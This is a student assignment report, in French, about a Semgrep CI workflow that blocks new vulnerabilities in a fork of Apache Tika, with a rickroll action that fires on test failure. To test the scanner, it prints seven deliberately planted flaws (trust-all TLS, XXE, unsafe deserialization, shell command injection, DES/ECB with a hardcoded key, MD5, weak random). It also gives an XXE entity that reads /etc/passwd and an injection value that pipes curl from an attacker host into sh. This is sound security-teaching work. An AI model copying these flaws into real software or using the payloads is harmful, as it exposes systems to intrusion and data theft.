# IFT3913 – Tâche 3 : Semgrep dans la CI, vulnérabilités et rickroll

| Nom complet | Identifiant GitHub |
|---|---|
| Houmayed Marwa | marwahoumayed22 |
| El Fakir Fatimazahrae | fatimazahrae5 |

Dépôt : [marwahoumayed22/tika](https://github.com/marwahoumayed22/tika), un fork d'Apache Tika. La documentation de la tâche 2 est dans le [README racine](../README.md).

| Élément | Emplacement |
|---|---|
| GitHub Action Semgrep (nouveau) | [`.github/workflows/semgrep.yml`](../.github/workflows/semgrep.yml) |
| Action réutilisable de rickroll (nouvelle) | [`.github/actions/rickroll/action.yml`](../.github/actions/rickroll/action.yml) |
| GitHub Action des tests (modifiée pour le rickroll) | [`.github/workflows/tache2.yml`](../.github/workflows/tache2.yml) |
| Les 7 vulnérabilités | Branche [`tache3-vulnerabilites`](https://github.com/marwahoumayed22/tika/tree/tache3-vulnerabilites) |
| Rapports Semgrep avant / après | [`tache3/rapports/`](rapports/) |

## Table des matières

1. [Modification du workflow : Semgrep bloque les nouvelles vulnérabilités](#1-modification-du-workflow--semgrep-bloque-les-nouvelles-vulnérabilités)
2. [Choix de conception et d'implémentation](#2-choix-de-conception-et-dimplémentation)
3. [Validation du workflow](#3-validation-du-workflow)
4. [Les 7 vulnérabilités introduites](#4-les-7-vulnérabilités-introduites)
5. [Comparaison des rapports Semgrep avant et après](#5-comparaison-des-rapports-semgrep-avant-et-après)
6. [Humour : rickroll quand un test échoue](#6-humour--rickroll-quand-un-test-échoue)

---

## 1. Modification du workflow : Semgrep bloque les nouvelles vulnérabilités

Le workflow [`semgrep.yml`](../.github/workflows/semgrep.yml) (« Tache 3 - Semgrep (nouvelles vulnerabilites) ») s'exécute à chaque *push* et à chaque *pull request* vers `main`. Il échoue **si et seulement si le commit introduit une vulnérabilité qui n'existait pas avant**.

Le cœur du workflow est une seule commande :

```bash
semgrep scan \
  --config "$RUNNER_TEMP/semgrep-rules/java" \   # règles Java officielles, commit figé
  --baseline-commit "$BASE" \                     # ne garder que ce qui est NOUVEAU par rapport à $BASE
  --exclude '*/src/test/*' \                      # code de production seulement
  --metrics=off \
  --error \                                       # code de sortie 1 s'il reste une alerte
  --json-output="$RUNNER_TEMP/semgrep-nouvelles.json" \
  $TARGETS                                        # les 5 modules du cas d'étude
```

`--baseline-commit` fait analyser par Semgrep l'état actuel **et** l'état de `$BASE`. Il ne rapporte que les alertes présentes maintenant et absentes de `$BASE`. Avec `--error`, il suffit d'**une** nouvelle alerte pour que l'étape, donc le build, échoue.

Le workflow comporte ensuite deux étapes exécutées même en cas d'échec (`if: always()`) :
- un **tableau des nouvelles vulnérabilités** (règle, sévérité, CWE, fichier:ligne) écrit dans le résumé du job (`$GITHUB_STEP_SUMMARY`) ;
- le **rapport JSON** publié comme artefact téléchargeable (`semgrep-nouvelles-vulnerabilites`).

---

## 2. Choix de conception et d'implémentation

| Choix | Alternative écartée | Justification |
|---|---|---|
| **Mode différentiel** (`--baseline-commit`) | Échouer sur *toute* alerte Semgrep | Le code original de Tika contient déjà **28 alertes** (section 5), dont plusieurs faux positifs (`hardcoded-conditional`, `eqeq`). Échouer sur toute alerte rendrait la CI rouge en permanence, ce qui la rendrait inutile. L'énoncé demande d'échouer sur une **nouvelle** vulnérabilité, ce que fait exactement le mode baseline. |
| **Choix du commit de référence selon l'événement** | Toujours comparer à `HEAD~1` | *Pull request* : on compare à la branche cible (`pull_request.base.sha`), donc à **tous** les commits de la PR. *Push* : on compare à l'état avant le push (`github.event.before`). Un push de 3 commits est ainsi vérifié en entier, ce que `HEAD~1` ne ferait pas. *Nouvelle branche ou lancement manuel* (`before` vaut `000…0` ou est inconnu après un *force-push*) : on compare au point de divergence avec `main` (`git merge-base origin/main HEAD`). |
| `fetch-depth: 0` | Clone superficiel (défaut : 1 commit) | Le mode baseline doit pouvoir extraire le commit de référence. |
| **Règles figées** : dépôt officiel [`semgrep/semgrep-rules`](https://github.com/semgrep/semgrep-rules), dossier `java/`, commit `a5ad171…` | Registre en ligne (`--config p/java` ou `auto`) | Le registre évolue sans prévenir. Une nouvelle règle publiée un lundi ferait échouer un commit qui ne change rien. Avec un commit figé, le résultat est **reproductible** et identique aux rapports produits localement (section 5). La mise à jour des règles devient un changement volontaire et visible. |
| **Semgrep figé** (`semgrep==1.185.0`) | `pip install semgrep` (dernière version) | Même raison : la reproductibilité. |
| **Cible : les 5 modules du cas d'étude** | Tout le dépôt Tika (≈ 200 modules) | Le périmètre du cours. L'analyse complète prendrait aussi beaucoup plus de temps. |
| `--exclude '*/src/test/*'` | Analyser aussi les tests | Les tests contiennent volontairement des motifs « dangereux » (XML piégés, faux certificats…). Une vulnérabilité compte quand elle est dans le code livré. |
| **Toutes les sévérités bloquent** (`ERROR` et `WARNING`) | Bloquer seulement `ERROR` | 5 de nos 7 vulnérabilités sont classées `WARNING` par Semgrep (MD5, DES, désérialisation, TLS…). Ce sont pourtant de vraies failles. Comme seules les **nouvelles** alertes bloquent, le coût reste faible : le développeur corrige, ou justifie avec un commentaire `// nosemgrep`. |
| Fichiers temporaires dans `$RUNNER_TEMP` | Écrire dans le dépôt | Le mode baseline exige un dépôt Git propre. Les règles et les rapports restent donc hors de l'arbre de travail. |
| **Workflow séparé** | Ajouter une étape au workflow de tests | Le contrôle de sécurité donne un statut distinct dans la PR (« Semgrep - nouvelles vulnérabilités »). Il ne dépend pas de la compilation Maven et s'exécute en moins d'une minute. |
| `permissions: contents: read` | Permissions par défaut | Principe du moindre privilège : l'analyse n'a besoin que de lire le code. |

**Coût :** en mode baseline, Semgrep n'analyse que les fichiers modifiés depuis la référence. Localement, le scan des 7 fichiers modifiés prend **12 s**, contre environ 4 min pour les 5 modules en entier.

---

## 3. Validation du workflow

### 3.1 Validation locale (mêmes commandes, mêmes versions)

| # | Scénario | Commit de référence | Attendu | Obtenu |
|---|---|---|---|---|
| L1 | Commit qui ajoute les 7 vulnérabilités | `main` d'origine | Échec | ✅ **code de sortie 1**, 11 nouvelles alertes, 7 fichiers analysés |
| L2 | Commit anodin (un commentaire) dans `NetworkParser.java`, qui contient **déjà** VULN-1 | le commit L1 | Succès | ✅ **code de sortie 0**, 0 nouvelle alerte |
| L3 | Code d'origine de Tika (28 alertes existantes) | lui-même | Succès | ✅ 0 nouvelle alerte : les alertes existantes ne bloquent pas |

L2 est le cas important. Il montre que le workflow ne pénalise pas un développeur qui modifie un fichier contenant déjà une alerte. Seul ce qu'il **ajoute** compte.

### 3.2 Validation dans GitHub Actions

| # | Scénario | Résultat du workflow Semgrep |
|---|---|---|
| G1 | Push sur `main` (README, workflows, sans nouvelle vulnérabilité) | ✅ succès — [exécution](https://github.com/marwahoumayed22/tika/actions/runs/43771129386) |
| G2 | [PR #3 `tache3-vulnerabilites` → `main`](https://github.com/marwahoumayed22/tika/pull/3), qui contient les 7 vulnérabilités | ❌ **échec** : « 11 Code Findings », étape « Semgrep - echec si nouvelle vulnerabilite » en échec — [exécution](https://github.com/marwahoumayed22/tika/actions/runs/43771990755) |
| G3 | [PR #2 `test-rickroll` → `main`](https://github.com/marwahoumayed22/tika/pull/2) (un test qui échoue, sans vulnérabilité) | ✅ succès (seul le workflow de tests échoue, section 6) — [exécution](https://github.com/marwahoumayed22/tika/actions/runs/43753339662) |

Dans l'exécution G2, Semgrep a créé un *worktree* du commit de référence (`main`), analysé uniquement les 7 fichiers modifiés et rapporté **11 nouvelles alertes**, exactement celles de la section 5. L'onglet **Summary** de l'exécution affiche le tableau des alertes, et le rapport JSON est téléchargeable dans les artefacts (`semgrep-nouvelles-vulnerabilites`).

**Effet secondaire utile :** sur cette même PR, le workflow de tests de la tâche 2 a d'abord échoué. Ce n'était pas à cause d'un test, mais de **Checkstyle** : `'}' is not followed by whitespace` dans `NetworkParser.java`, à la fermeture de la classe anonyme `X509TrustManager` placée dans un initialiseur de tableau. Nous avons corrigé la mise en forme (le gestionnaire de confiance est déclaré dans une variable, puis placé dans le tableau). La vulnérabilité est inchangée et Semgrep la détecte toujours aux mêmes lignes. La CI a donc rempli ses deux rôles : bloquer la faille (Semgrep) et le code mal formé (Checkstyle).

---

## 4. Les 7 vulnérabilités introduites

Elles sont dans la branche [`tache3-vulnerabilites`](https://github.com/marwahoumayed22/tika/tree/tache3-vulnerabilites). Chacune est marquée par un commentaire `IFT3913 TACHE 3 - VULN-n`.

**Critères de choix :**
1. **7 types différents** : 7 CWE distincts, dont aucun n'était déjà signalé dans le code d'origine.
2. **Répartition sur les 5 modules** du cas d'étude.
3. **Fichiers choisis pour leur vraisemblance** : chaque faille est placée là où une erreur de ce type pourrait réellement être commise (réseau dans le parseur réseau, XML dans l'utilitaire XML, mots de passe dans les parseurs de documents chiffrés…).
4. **Code qui compile** : vérifié avec `javac` sur chaque ajout, et par la GitHub Action de la tâche 2 qui compile et teste `tika-core` sur la PR.

| # | Type (CWE) | Module | Fichier | Règle(s) Semgrep | Sévérité |
|---|---|---|---|---|---|
| 1 | Validation de certificat TLS désactivée (CWE-295) | tika-core | `parser/NetworkParser.java` | `insecure-trust-manager` (×3), `weak-ssl-context` | WARNING |
| 2 | Injection d'entités externes XML, XXE (CWE-611) | tika-core | `utils/XMLReaderUtils.java` | `documentbuilderfactory-disallow-doctype-decl-missing` | **ERROR** |
| 3 | Aléa prévisible (CWE-330) | tika-core | `io/TemporaryResources.java` | `weak-random` | WARNING |
| 4 | Désérialisation non sûre (CWE-502) | tika-serialization | `serialization/JsonMetadata.java` | `object-deserialization` | WARNING |
| 5 | Injection de commande système (CWE-78) | tika-parser-ocr-module | `parser/ocr/TesseractOCRParser.java` | `command-injection-formatted-runtime-call` | **ERROR** |
| 6 | Chiffrement faible DES/ECB (CWE-326 / CWE-327) | tika-parser-pdf-module | `parser/pdf/PDFParser.java` | `des-is-deprecated`, `ecb-cipher` | WARNING |
| 7 | Hachage faible MD5 (CWE-328) | tika-parser-microsoft-module | `parser/microsoft/OfficeParser.java` | `use-of-md5` | WARNING |

### VULN-1 — Validation TLS désactivée (CWE-295)

**Fichier :** [`tika-core/.../parser/NetworkParser.java`](https://github.com/marwahoumayed22/tika/blob/tache3-vulnerabilites/tika-core/src/main/java/org/apache/tika/parser/NetworkParser.java#L86-L124). `NetworkParser` envoie le document à un serveur distant (`http(s)://…`) et lit la réponse. C'est le seul composant de tika-core qui ouvre une connexion HTTPS, donc l'endroit naturel où un développeur « contournerait » une erreur de certificat.

```java
if (connection instanceof HttpsURLConnection) {
    ((HttpsURLConnection) connection).setSSLSocketFactory(trustAllSocketFactory());
}
...
new X509TrustManager() {
    public X509Certificate[] getAcceptedIssuers() { return null; }
    public void checkClientTrusted(X509Certificate[] certs, String authType) {}
    public void checkServerTrusted(X509Certificate[] certs, String authType) {}
}
```

**Pourquoi c'est vulnérable :** `checkServerTrusted` est vide, donc **tout** certificat est accepté, même expiré, auto-signé ou émis pour un autre domaine. Un attaquant placé entre Tika et le serveur (Wi-Fi public, DNS empoisonné) se fait passer pour le serveur. Il lit les documents envoyés, qui sont souvent confidentiels, et peut modifier les réponses.

**Résultat Semgrep :** 4 alertes. `insecure-trust-manager` signale chacune des trois méthodes vides (lignes 108, 112, 114). `weak-ssl-context` signale `SSLContext.getInstance("TLS")` (ligne 117) : le protocole « TLS » générique peut négocier d'anciennes versions, ce qui est une alerte secondaire. La faille principale reste le gestionnaire de confiance vide.

### VULN-2 — XXE (CWE-611)

**Fichier :** [`tika-core/.../utils/XMLReaderUtils.java`](https://github.com/marwahoumayed22/tika/blob/tache3-vulnerabilites/tika-core/src/main/java/org/apache/tika/utils/XMLReaderUtils.java#L595-L610). Cette classe sert justement à **fabriquer des parseurs XML sécurisés** pour tout Tika. Nous y ajoutons `buildDOMFast(InputStream)`, une variante « rapide » qui contourne le pool sécurisé. C'est un scénario réaliste d'optimisation qui fait régresser la sécurité.

```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setNamespaceAware(true);
DocumentBuilder builder = factory.newDocumentBuilder();
return builder.parse(is);
```

**Pourquoi c'est vulnérable :** la fabrique est utilisée avec ses réglages par défaut, qui acceptent les DOCTYPE et les entités externes. Tika lit des fichiers soumis par des inconnus. Un document contenant `<!ENTITY x SYSTEM "file:///etc/passwd">` fait inclure ce fichier local dans le texte extrait. Une URL interne déclenche une requête du serveur (SSRF), et des entités imbriquées épuisent la mémoire (« billion laughs »). La méthode sûre, `getDocumentBuilderFactory()`, active `disallow-doctype-decl`.

**Résultat Semgrep :** `documentbuilderfactory-disallow-doctype-decl-missing`, sévérité **ERROR**, ligne 607. Les 3 alertes XML déjà présentes dans ce fichier avant la modification ne sont pas comptées comme nouvelles.

### VULN-3 — Aléa prévisible (CWE-330)

**Fichier :** [`tika-core/.../io/TemporaryResources.java`](https://github.com/marwahoumayed22/tika/blob/tache3-vulnerabilites/tika-core/src/main/java/org/apache/tika/io/TemporaryResources.java#L88-L98). `createTempFile` crée **tous** les fichiers temporaires de Tika : chaque document trop gros pour la mémoire y est copié.

```java
Path dir = tempFileDir == null ? Paths.get(System.getProperty("java.io.tmpdir")) : tempFileDir;
String name = "apache-tika-" + Long.toHexString(new Random().nextLong()) + actualSuffix;
final Path path = Files.createFile(dir.resolve(name));
```

**Pourquoi c'est vulnérable :** `java.util.Random` est un générateur linéaire congruentiel. Quelques valeurs observées suffisent pour prédire les suivantes. L'original utilisait `Files.createTempFile`, qui s'appuie sur `SecureRandom`. Dans un répertoire `/tmp` partagé, un utilisateur local peut deviner le prochain nom et le pré-créer, ce qui fait échouer le traitement (déni de service). Il peut aussi observer le fichier pour lire le contenu des documents traités.

**Résultat Semgrep :** `weak-random`, ligne 97.

### VULN-4 — Désérialisation non sûre (CWE-502)

**Fichier :** [`tika-serialization/.../serialization/JsonMetadata.java`](https://github.com/marwahoumayed22/tika/blob/tache3-vulnerabilites/tika-serialization/src/main/java/org/apache/tika/serialization/JsonMetadata.java#L127-L143). Ce module (dé)sérialise les métadonnées en JSON. Nous ajoutons `fromJavaSerialized(InputStream)`, censée relire un « ancien format » de métadonnées, ce qui est un prétexte courant pour réintroduire la sérialisation Java.

```java
ObjectInputStream ois = new ObjectInputStream(stream);
return (Metadata) ois.readObject();
```

**Pourquoi c'est vulnérable :** `readObject()` instancie **n'importe quelle** classe sérialisable du classpath **avant** le cast en `Metadata`. Aucun filtre (`ObjectInputFilter`) ne limite les classes acceptées. Avec une chaîne de « gadgets » présente dans les dépendances (commons-collections, par exemple), un flux forgé exécute du code arbitraire pendant la désérialisation. C'est la classe de failles derrière de nombreuses RCE Java.

**Résultat Semgrep :** `object-deserialization`, ligne 137.

### VULN-5 — Injection de commande (CWE-78)

**Fichier :** [`tika-parser-ocr-module/.../ocr/TesseractOCRParser.java`](https://github.com/marwahoumayed22/tika/blob/tache3-vulnerabilites/tika-parsers/tika-parsers-standard/tika-parsers-standard-modules/tika-parser-ocr-module/src/main/java/org/apache/tika/parser/ocr/TesseractOCRParser.java#L217-L232). Ce parseur lance déjà le programme externe `tesseract`. Nous ajoutons `isLanguageInstalled(String language)`, qui vérifie la présence d'un pack de langue.

```java
Process process = java.lang.Runtime.getRuntime().exec(new String[]{"sh", "-c",
        "ls " + tessdata + "/" + language + ".traineddata"});
```

**Pourquoi c'est vulnérable :** la langue OCR peut être fixée **à chaque requête** par l'appelant (`TesseractOCRConfig.setLanguage`, ou l'en-tête `X-Tika-OCRLanguage` de tika-server). Elle est concaténée telle quelle dans une ligne de commande interprétée par `sh -c`. La valeur `eng; curl http://attaquant/x | sh` exécute un script arbitraire sur le serveur. Le code d'origine, lui, passe chaque argument séparément à `ProcessBuilder`, sans shell.

**Résultat Semgrep :** `command-injection-formatted-runtime-call`, sévérité **ERROR**, ligne 228.

> **Remarque de mise au point :** notre première version écrivait `Runtime.getRuntime()` et **n'était pas détectée**. La règle n'identifie le type que par son nom complet (son propre fichier de test contient `import java.lang.Runtime;`). Avec `java.lang.Runtime.getRuntime()`, l'alerte apparaît. Cela illustre une limite de l'analyse statique : une même faille peut échapper à un outil selon la façon dont elle est écrite.

### VULN-6 — Chiffrement faible DES en mode ECB (CWE-326 / CWE-327)

**Fichier :** [`tika-parser-pdf-module/.../pdf/PDFParser.java`](https://github.com/marwahoumayed22/tika/blob/tache3-vulnerabilites/tika-parsers/tika-parsers-standard/tika-parsers-standard-modules/tika-parser-pdf-module/src/main/java/org/apache/tika/parser/pdf/PDFParser.java#L602-L619). `PDFParser` manipule le mot de passe des PDF chiffrés (`getPassword`). Nous ajoutons `encryptPasswordForCache`, qui chiffre ce mot de passe pour le conserver en cache.

```java
SecretKeySpec key = new SecretKeySpec("tika1234".getBytes(StandardCharsets.UTF_8), "DES");
Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");
```

**Pourquoi c'est vulnérable :**
- **DES** n'a qu'une clé effective de 56 bits, cassable par force brute en quelques heures sur du matériel courant.
- Le mode **ECB** chiffre deux blocs identiques de la même façon, ce qui révèle la structure du texte clair.
- En bonus, la clé est **codée en dur** dans le code source (CWE-798) : quiconque lit le code peut déchiffrer.

**Résultat Semgrep :** deux alertes sur la ligne 611, `des-is-deprecated` et `ecb-cipher`. La clé codée en dur n'est **pas** détectée par les règles Java utilisées (il faudrait le jeu de règles `secrets`).

### VULN-7 — Hachage faible MD5 (CWE-328)

**Fichier :** [`tika-parser-microsoft-module/.../microsoft/OfficeParser.java`](https://github.com/marwahoumayed22/tika/blob/tache3-vulnerabilites/tika-parsers/tika-parsers-standard/tika-parsers-standard-modules/tika-parser-microsoft-module/src/main/java/org/apache/tika/parser/microsoft/OfficeParser.java#L311-L327). `OfficeParser` déchiffre les documents Office protégés avec le mot de passe fourni. Nous ajoutons `passwordFingerprint`, qui calcule une « empreinte » de ce mot de passe pour la journaliser.

```java
MessageDigest digest = MessageDigest.getInstance("MD5");
byte[] hash = digest.digest(password.getBytes(StandardCharsets.UTF_8));
```

**Pourquoi c'est vulnérable :** MD5 est cassé (collisions) et surtout **très rapide** : des milliards d'essais par seconde sur GPU. Sans sel, l'empreinte d'un mot de passe courant se retrouve directement dans une table arc-en-ciel. Exemple : `password` donne `5f4dcc3b5aa765d61d8327deb882cf99`, qu'on retrouve en une recherche web. Journaliser cette empreinte revient presque à journaliser le mot de passe.

**Résultat Semgrep :** `use-of-md5`, ligne 320.

---

## 5. Comparaison des rapports Semgrep avant et après

Rapports bruts dans [`tache3/rapports/`](rapports/) : `semgrep-avant.*` (code d'origine), `semgrep-apres.*` (avec les 7 vulnérabilités) et `semgrep-nouvelles.*` (mode baseline, uniquement les différences). Ils ont été produits avec la même version de Semgrep et les mêmes règles que le workflow.

| | Avant | Après | Différence |
|---|---|---|---|
| **Total des alertes** | **28** | **39** | **+11** |
| Fichiers concernés | 19 | 23 | +4 |

`NetworkParser`, `XMLReaderUtils` et `TesseractOCRParser` avaient déjà des alertes avant, ce qui explique +4 fichiers et non +7.

| Règle Semgrep | Avant | Après | | Vulnérabilité |
|---|---|---|---|---|
| `insecure-trust-manager` | 0 | 3 | **+3** | VULN-1 |
| `weak-ssl-context` | 0 | 1 | **+1** | VULN-1 |
| `documentbuilderfactory-disallow-doctype-decl-missing` | 0 | 1 | **+1** | VULN-2 |
| `weak-random` | 0 | 1 | **+1** | VULN-3 |
| `object-deserialization` | 0 | 1 | **+1** | VULN-4 |
| `command-injection-formatted-runtime-call` | 0 | 1 | **+1** | VULN-5 |
| `des-is-deprecated` | 0 | 1 | **+1** | VULN-6 |
| `ecb-cipher` | 0 | 1 | **+1** | VULN-6 |
| `use-of-md5` | 0 | 1 | **+1** | VULN-7 |
| `hardcoded-conditional` | 9 | 9 | = | (code d'origine) |
| `unsafe-reflection` | 7 | 7 | = | (code d'origine) |
| `command-injection-process-builder` | 7 | 7 | = | (code d'origine) |
| `eqeq` | 2 | 2 | = | (code d'origine) |
| `saxparserfactory-disallow-doctype-decl-missing` | 1 | 1 | = | (code d'origine) |
| `xmlinputfactory-possible-xxe` | 1 | 1 | = | (code d'origine) |
| `unencrypted-socket` | 1 | 1 | = | (code d'origine) |

**Observations :**
- Les **11 nouvelles alertes** correspondent exactement à nos 7 vulnérabilités. Aucune alerte d'origine n'a disparu, et aucune autre n'est apparue.
- **Les 9 règles déclenchées sont toutes nouvelles** : aucune n'apparaissait avant. Les 7 vulnérabilités sont donc bien de types différents de ce que contenait déjà Tika.
- Le rapport `semgrep-nouvelles.txt` (mode baseline) liste exactement ces 11 alertes. C'est ce que voit la CI.
- Le code d'origine contient déjà 7 alertes `command-injection-process-builder` dans `ExternalParser`, `TesseractOCRParser`, etc. Ce sont surtout des **faux positifs ou des risques acceptés** : les commandes sont construites à partir de la configuration de l'administrateur, et non de l'entrée utilisateur. C'est la raison même du mode différentiel.

---

## 6. Humour : rickroll quand un test échoue

### 6.1 Action réutilisable

[`.github/actions/rickroll/action.yml`](../.github/actions/rickroll/action.yml) est une **version modifiée** de l'action [TejasvOnly/random-rickroll](https://github.com/TejasvOnly/random-rickroll) (licence Apache 2.0) :

| | Action d'origine | Notre version |
|---|---|---|
| Type | JavaScript, runtime `node12`, **retiré de GitHub Actions** (l'action ne s'exécute plus) | **Composite** (bash), sans aucune dépendance npm |
| Déclencheur | Ouverture d'un ticket (*issue*). Échoue s'il n'y a pas de ticket. | **Échec d'un cas de test** (appelée avec `if: failure()`) |
| Rickroll | Commentaire sur le ticket | GIF + lien dans le **résumé du job**, **annotation** visible sur la page du workflow, **commentaire sur la PR** s'il y en a une, bannière dans le journal |
| Entrée `percentage` | Probabilité de rickroller | Conservée (100 par défaut) |
| Sortie | — | `rickrolled` = `true` / `false` |

### 6.2 Intégration dans la suite de tests de Tika

Dans [`tache2.yml`](../.github/workflows/tache2.yml), qui exécute les tests de tika-core :

```yaml
      - name: Compiler et tester tika-core
        id: tests
        run: mvn -B -pl tika-core -am install

      # Tache 3 : un cas de test a echoue -> rickroll
      - name: Rickroll si un test echoue
        if: failure() && steps.tests.outcome == 'failure'
        uses: ./.github/actions/rickroll
        with:
          percentage: '100'
```

- `if: failure() && steps.tests.outcome == 'failure'` : le rickroll ne se déclenche **que** si l'étape de tests échoue. Une panne d'une autre étape (PIT, publication du rapport) ne le déclenche pas.
- `permissions: pull-requests: write` est ajouté au workflow pour que l'action puisse commenter la PR.

### 6.3 Validation

La branche [`test-rickroll`](https://github.com/marwahoumayed22/tika/tree/test-rickroll) ajoute un test qui échoue volontairement (`RickrollDemoTest.testNeverGonnaPass`, qui affirme `1987 == 2026`). Sur la [PR #2 `test-rickroll` → `main`](https://github.com/marwahoumayed22/tika/pull/2) ([exécution](https://github.com/marwahoumayed22/tika/actions/runs/43753339640)) :
- le workflow « Tache 2 - tests et mutation » échoue sur ce test ;
- l'étape **« Rickroll si un test echoue »** s'exécute ;
- le GIF apparaît dans le résumé du job et en commentaire de la PR.

Cette branche n'est pas fusionnée. Sur `main`, les tests passent et l'étape de rickroll est ignorée (*skipped*).

Résultat de l'exécution : `Compiler et tester tika-core` ❌ → `Rickroll si un test echoue` ✅ → `Analyse de mutation PIT` *skipped*. Le commentaire de `github-actions[bot]` avec le GIF est visible dans la [conversation de la PR #2](https://github.com/marwahoumayed22/tika/pull/2).
